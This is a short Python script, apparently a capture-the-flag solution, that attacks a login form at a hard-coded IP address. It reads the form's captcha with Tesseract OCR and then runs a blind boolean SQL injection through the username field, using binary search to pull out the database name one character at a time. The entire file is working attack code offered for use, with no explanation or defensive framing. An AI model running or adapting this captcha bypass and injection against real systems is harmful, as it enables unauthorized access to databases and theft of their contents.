from PIL import Image
import pytesseract
import requests
import re
import base64
import Image

table = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '_', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '{', '}']
password = []
def compare(index, comp, character):
	while True:
		url = 'http://125.235.240.166:5000/'
		session = requests.Session()
		r = session.get(url)
		x = r.text
		m = re.search('base64,(.+?)\'/>', x)
		imgstring = m.group(1)
		imgdata = base64.b64decode(imgstring)
		fileGIF = 'some_image.gif'
		with open(fileGIF, 'wb') as f:
			f.write(imgdata)
		filename = 'test.jpg'
		Image.open(fileGIF).convert('RGB').save(filename)
		captcha = pytesseract.image_to_string(Image.open(filename), config='-psm 8 -c tessedit_char_whitelist=0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ')
		query = "' or ord(substr(database(),%d,1)) %s ord('%s') -- -" % (index, comp, character)
		datas = {'username': query, 'password': 'password', 'captcha': captcha}
		r = session.post(url, data = datas)
		print 'error: ' + str(r.text.find('Error') == -1) + ' captcha: ' + str(r.text.find('Sai Captcha') == -1)
		if (r.text.find('Error') == -1) and (r.text.find('Sai Captcha') == -1):
			#print r.text
			return r.text.find("are you admin") != -1	
			break	

def binary_search(item_list, index):
    first = 0
    last = len(item_list) - 1
    found = False
    while (first <= last and not found):
        mid = (first + last) // 2
        if compare(index, '=', item_list[mid]):
            found = True
        else:
            if compare(index, '<', item_list[mid]):
                last = mid - 1
            else:
                first = mid + 1
    password.append(item_list[mid])
    return item_list[mid]
	
for i in range(1, 40):
    print(binary_search(table, i))
    print ''.join(password)
